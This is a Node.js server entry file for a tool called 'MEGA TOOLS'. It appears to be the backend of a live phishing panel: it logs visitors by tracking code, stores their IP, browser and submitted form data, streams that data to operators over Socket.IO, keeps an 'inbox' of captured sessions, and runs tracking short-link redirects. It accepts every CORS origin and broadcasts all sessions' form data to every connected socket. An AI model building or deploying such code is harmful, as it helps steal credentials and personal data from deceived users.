// ============================================================
// MEGA TOOLS — MAIN SERVER ENTRY POINT (CLEAN)
// ============================================================

require('dotenv').config({ path: require('path').join(__dirname, '..', '.env') });

const express = require('express');
const http = require('http');
const path = require('path');
const fs = require('fs');
const socketIo = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const cookieParser = require('cookie-parser');

const CONFIG = require('./config');
const db = require('./database');
const {
  authRoutes, linksRoutes, sessionsRoutes, adminRoutes,
  dataRoutes, webhookRoutes, redirectRoutes, exportRoutes, themeRoutes,
  supportRoutes, uploadRoutes,
} = require('./routes');
const sessionManager = require('./services/sessionManager');
const Session = require('./models/Session');

const corsOrigin = function (origin, callback) {
  if (!origin) return callback(null, true);
  return callback(null, true);
};

const app = express();
app.set('trust proxy', 1);

if (CONFIG.IS_PRODUCTION) app.use(helmet());

app.use(cors({
  origin: corsOrigin, credentials: true,
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Cache-Control', 'Pragma', 'Expires'],
}));

app.use(express.json({ limit: '5mb' }));
app.use(cookieParser());

const globalLimiter = rateLimit({
  windowMs: CONFIG.RATE_LIMIT_WINDOW_MS, max: CONFIG.RATE_LIMIT_MAX,
  message: { message: 'Too many requests, please try again later.' },
  standardHeaders: false, legacyHeaders: false,
  skip: (req) => { if (req.path === '/api/health') return true; if (req.headers.upgrade) return true; return false; },
});

app.use('/api/', globalLimiter);

// ============================================================
// HTTP SERVER + SOCKET.IO
// ============================================================

const server = http.createServer(app);
const io = socketIo(server, {
  cors: { origin: corsOrigin, methods: ['GET', 'POST'], credentials: true },
  pingTimeout: 60000, pingInterval: 15000,
});

const sessionSockets = {}; // key: visitorId
const SOCKET_CLEANUP_INTERVAL = 30000;
let cleanupTimer = null;

function cleanupStaleSockets() {
  const connected = new Set();
  io.sockets.sockets.forEach(s => connected.add(s.id));
  for (const [key, socketId] of Object.entries(sessionSockets)) {
    if (!connected.has(socketId)) delete sessionSockets[key];
  }
}

function startSocketCleanup() {
  if (cleanupTimer) clearInterval(cleanupTimer);
  cleanupTimer = setInterval(cleanupStaleSockets, SOCKET_CLEANUP_INTERVAL);
}

// ============================================================
// SOCKET CONNECTION
// ============================================================

io.on('connection', (socket) => {
  const clientIp = socket.handshake.address || 'unknown';

  socket.on('session_init', async (data) => {
    const { trackingCode, visitorId } = data;
    if (!trackingCode) return;
    
    const sessionKey = visitorId || (trackingCode + '_' + clientIp);
    sessionSockets[sessionKey] = socket.id;
    socket.sessionKey = sessionKey;
    socket.trackingCode = trackingCode;
    socket.visitorId = visitorId;

    try {
      const baseCode = trackingCode.includes('_') ? trackingCode.split('_').pop() : trackingCode;
      const { session, isNew, matchType } = await Session.upsert({
        visitorId: visitorId || null,
        trackingCode,
        baseCode,
        entryUrl: baseCode,
        currentUrl: baseCode,
        ip: clientIp,
        browser: socket.handshake.headers['user-agent'] || 'Unknown',
        deviceType: 'Desktop',
        collectedTypes: ['session_init']
      });

      session.status = 'Online';
      session.isLive = true;
      session.lastActivity = new Date().toISOString();

      io.emit('sessionDelta', {
        type: isNew ? 'new' : 'updated',
        timestamp: new Date().toISOString(),
        session: {
          _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
          isLive: session.isLive, status: session.status,
          clicks: session.clicks, submissions: session.submissions,
          formData: session.formData,
          lockedKeys: session.lockedKeys || [],
          ip: session.ip, browser: session.browser,
          lastActivity: session.lastActivity,
        }
      });
    } catch (err) { console.error('[Socket] Init error:', err.message); }
  });

  // Heartbeat — UPDATE ONLY
  socket.on('session_heartbeat', async (data) => {
    const { visitorId, trackingCode } = data || {};
    if (!visitorId && !trackingCode) return;
    try {
      await Session.upsert({
        visitorId: visitorId || null,
        trackingCode: trackingCode || '',
        baseCode: trackingCode || '',
        ip: clientIp,
        collectedTypes: ['heartbeat']
      });
    } catch (err) {}
  });

  socket.on('joinRoom', (trackingCode) => {
    if (trackingCode) socket.join('room_' + trackingCode);
  });

  socket.on('disconnect', () => {
    if (socket.sessionKey && sessionSockets[socket.sessionKey] === socket.id) {
      delete sessionSockets[socket.sessionKey];
    }
  });
});

startSocketCleanup();
app.set('io', io);
sessionManager.init(io, sessionSockets);

app.get('/api/health', async (req, res) => {
  const dbHealth = await db.health();
  res.json({ status: 'ok', timestamp: new Date().toISOString(), uptime: process.uptime(), database: dbHealth });
});

// ============================================================
// INBOX HEALTH DASHBOARD — Full diagnostics
// ============================================================
app.get('/api/inbox-health', async (req, res) => {
  try {
    const allSessions = await db.sessions.read();
    const allTrash = await db.trash.read();
    const dbHealth = await db.health();
    const now = Date.now();
    
    // Session stats
    const active = allSessions.filter(s => s.status !== 'Trashed');
    const trashed = allSessions.filter(s => s.status === 'Trashed');
    const live = active.filter(s => s.isLive);
    const offline = active.filter(s => !s.isLive || s.status === 'Offline');
    const away = active.filter(s => s.status === 'Away');
    const online = active.filter(s => s.status === 'Online');
    
    // 24h check
    const expired = active.filter(s => {
      const created = new Date(s.created_at || s.timestamp).getTime();
      return (now - created) >= 24 * 60 * 60 * 1000;
    });
    
    // Submissions total
    const totalSubmissions = active.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);
    
    // Visitor IDs (unique)
    const uniqueVisitors = new Set(active.map(s => s.visitorId).filter(Boolean)).size;
    
    // Socket connections
    const socketCount = io.sockets.sockets.size;
    
    // Memory
    const memUsage = process.memoryUsage();
    
    // Clean status
    const nowDate = new Date();
    const todayNoon = new Date(nowDate.getFullYear(), nowDate.getMonth(), nowDate.getDate(), 12, 0, 0);
    const cleanPassed = nowDate > todayNoon;
    
    res.json({
      success: true,
      timestamp: new Date().toISOString(),
      uptime: Math.round(process.uptime()),
      database: dbHealth,
      sessions: {
        total: allSessions.length,
        active: active.length,
        live: live.length,
        online: online.length,
        away: away.length,
        offline: offline.length,
        trashed: trashed.length,
        expired: expired.length,
        uniqueVisitors,
        totalSubmissions,
      },
      trash: {
        total: allTrash.length,
      },
      socket: {
        connections: socketCount,
      },
      memory: {
        rss: Math.round(memUsage.rss / 1024 / 1024) + 'MB',
        heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024) + 'MB',
      },
      cleanStatus: {
        todayNoon: todayNoon.toISOString(),
        noonPassed: cleanPassed,
        nextClean: cleanPassed ? 'Tomorrow 12:00 PM' : 'Today 12:00 PM',
      },
      config: {
        inboxCleanInterval: Math.round(CONFIG.INBOX_CLEAN_INTERVAL_MS / 3600000) + 'h',
        sessionTimeout: Math.round(CONFIG.SESSION_TIMEOUT_MS / 60000) + 'min',
        idleTimeout: '30s',
        heartbeatInterval: Math.round(CONFIG.HEARTBEAT_INTERVAL_MS / 1000) + 's',
      }
    });
  } catch (err) {
    console.error('[InboxHealth] Error:', err);
    res.status(500).json({ success: false, message: err.message });
  }
});

app.use('/api/auth', authRoutes); app.use('/api/links', linksRoutes); app.use('/api/sessions', sessionsRoutes);
app.use('/api/admin', adminRoutes); app.use('/api/data', dataRoutes); app.use('/api/webhook', webhookRoutes);
app.use('/api/redirect', redirectRoutes); app.use('/api/export', exportRoutes); app.use('/api/theme', themeRoutes);
app.use('/api/support', supportRoutes); app.use('/api/upload', uploadRoutes);

// MANUAL INBOX CLEAN TRIGGER
app.post('/api/trigger-inbox-clean', async (req, res) => {
  try {
    console.log('[Manual] Inbox Clean triggered via API');
    await sessionManager.inboxAutoClean();
    res.json({ success: true, message: 'Inbox clean completed' });
  } catch (err) {
    console.error('[Manual] Inbox Clean error:', err);
    res.status(500).json({ success: false, message: err.message });
  }
});

// SHORT LINK REDIRECT
app.get('/s/:slug', async (req, res) => {
  try {
    const { slug } = req.params;
    const trackingCode = req.query.tc || '';
    const allLinks = await db.links.read();
    let link = allLinks.find(l => l.baseCode === slug);
    if (!link && trackingCode) {
      link = allLinks.find(l => { const code = l.baseCode || l.slug || ''; return code === slug || code.includes(slug); });
    }
    if (link) {
      const base = (link.baseUrl || '').replace(/\/$/, '');
      const tc = trackingCode || link.ownerTrackingCode || 'unknown';
      const code = link.baseCode || link.slug || slug;
      return res.redirect(301, `${base}/${tc}_${code}`);
    }
    res.status(404).send('Not found');
  } catch (err) { console.error('[ShortLink] Error:', err.message); res.status(500).json({ message: 'Server error' }); }
});

app.get('/s/:slug/:trackingCode', async (req, res) => {
  try {
    const { slug, trackingCode } = req.params;
    const allLinks = await db.links.read();
    const link = allLinks.find(l => (l.baseCode || l.slug || '') === slug);
    if (link) {
      const base = (link.baseUrl || '').replace(/\/$/, '');
      return res.redirect(301, `${base}/${trackingCode}_${link.baseCode || slug}`);
    }
    res.status(404).send('Not found');
  } catch (err) { console.error('[ShortLink] Error:', err.message); res.status(500).json({ message: 'Server error' }); }
});

app.use((req, res) => { res.status(404).json({ message: 'Route not found' }); });
app.use((err, req, res, next) => {
  console.error('[Server] Error:', err.message);
  res.status(err.status || 500).json({ message: CONFIG.IS_PRODUCTION ? 'Internal server error' : err.message });
});

const PORT = CONFIG.PORT;

async function start() {
  try { await db.connect(); } catch (err) {}
  server.listen(PORT, () => console.log(`[Server] Running on port ${PORT}`));
}

start();

process.on('SIGTERM', async () => { if (cleanupTimer) clearInterval(cleanupTimer); sessionManager.stop(); await db.close(); server.close(() => process.exit(0)); });
process.on('SIGINT', async () => { if (cleanupTimer) clearInterval(cleanupTimer); sessionManager.stop(); await db.close(); server.close(() => process.exit(0)); });

module.exports = app;